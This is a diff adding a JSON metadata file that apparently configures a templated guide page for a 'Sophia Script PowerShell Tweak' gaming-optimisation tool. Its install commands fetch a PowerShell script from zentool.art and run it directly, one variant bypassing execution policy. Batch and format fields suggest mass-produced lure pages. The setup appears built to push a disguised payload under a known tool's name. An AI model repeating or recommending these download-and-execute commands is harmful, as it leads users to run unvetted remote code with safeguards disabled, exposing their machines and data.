@@ -1,0 +1,28 @@
+{
+  "repo": "Sophia-Script-PowerShell-Tweak",
+  "product": "Sophia Script PowerShell Tweak",
+  "product_title": "Sophia Script PowerShell Tweak",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "gaming",
+  "topics": [
+    "sophia-script-powershell-tweak-windows",
+    "sophia-config",
+    "sophia-integration",
+    "sophia-latest",
+    "gaming-performance",
+    "fps-tuning",
+    "windows-gaming",
+    "latency",
+    "game-client",
+    "performance-optimization",
+    "frame-timing",
+    "pc-gaming"
+  ],
+  "site": "zentool.art"
+}
